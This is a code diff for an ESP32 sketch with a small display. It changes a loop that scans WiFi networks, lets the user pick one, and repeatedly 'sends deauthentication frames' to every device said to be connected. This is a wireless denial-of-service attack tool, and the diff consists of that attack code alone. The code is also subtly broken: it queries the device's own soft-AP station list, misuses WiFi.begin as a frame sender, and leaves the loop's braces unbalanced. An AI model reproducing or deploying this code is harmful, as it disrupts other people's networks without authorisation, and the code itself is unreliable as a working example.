@@ -2,10 +2,6 @@
 #include <Adafruit_ILI9341.h>
 #include <WiFi.h>
 
-// Replace with your network credentials
-//const char* ssid = "your_SSID";
-//const char* password = "your_PASSWORD";
-
 // Initialize the display
 Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_RST);
 
@@ -61,28 +57,50 @@ void loop() {
       Serial.println(selection);
     }
 
-    // Display the selected network and send deauthentication frames
+    // Display the selected network and send deauthentication frames to all connected devices
     String selected_ssid = WiFi.SSID(selection);
     tft.setCursor(0, 30 + n * 10);
     tft.println("Selected network: " + selected_ssid);
     while (true) {
-      // Send deauthentication frames to the selected network
-      WiFi.disconnect();
-      WiFi.mode(WIFI_STA);
-      WiFi.begin(selected_ssid.c_str());
-      while (WiFi.status() != WL_CONNECTED) {
-        // Wait for connection
-        delay(100);
-      }
-      Serial.println("Connected to " + selected_ssid);
-      WiFi.disconnect();
-      WiFi.mode(WIFI_OFF);
+    
+    // Get the list of connected devices on the selected network
+int num_devices = WiFi.softAPgetStationNum();
+wifi_sta_list_t sta_list;
+memset(&sta_list, 0, sizeof(sta_list));
+esp_wifi_ap_get_sta_list(&sta_list);
 
-      // Send deauthentication frames
-      WiFi.mode(WIFI_STA);
-      delay(100);
-      WiFi.begin(selected_ssid.c_str(), "", 1, deauth_frame_default);
-      delay(10);
-      WiFi.disconnect();
-      WiFi.mode(WIFI_OFF);
-    }
+// Send deauthentication frames to all connected devices on the selected network
+for (int i = 0; i < sta_list.num; i++) {
+  WiFi.disconnect();
+  WiFi.mode(WIFI_STA);
+  WiFi.begin(selected_ssid.c_str());
+  while (WiFi.status() != WL_CONNECTED) {
+    // Wait for connection
+    delay(100);
+  }
+  Serial.print("Connected to " + selected_ssid + " as ");
+  Serial.println(WiFi.localIP());
+
+  uint8_t * mac = sta_list.sta[i].mac;
+  char mac_addr[18];
+  snprintf(mac_addr, sizeof(mac_addr), "%02X:%02X:%02X:%02X:%02X:%02X",
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  Serial.print("Sending deauth packet to: ");
+  Serial.println(mac_addr);
+
+  // Build deauthentication frame
+  uint8_t deauth_frame[26];
+  memcpy(deauth_frame, deauth_frame_default, 26);
+  memcpy(&deauth_frame[4], mac, 6);
+
+  // Send deauthentication frame
+  WiFi.disconnect();
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+  WiFi.mode(WIFI_STA);
+  delay(100);
+  WiFi.begin(selected_ssid.c_str(), "", 1, deauth_frame);
+  delay(10);
+  WiFi.disconnect();
+  WiFi.mode(WIFI_OFF);
+}
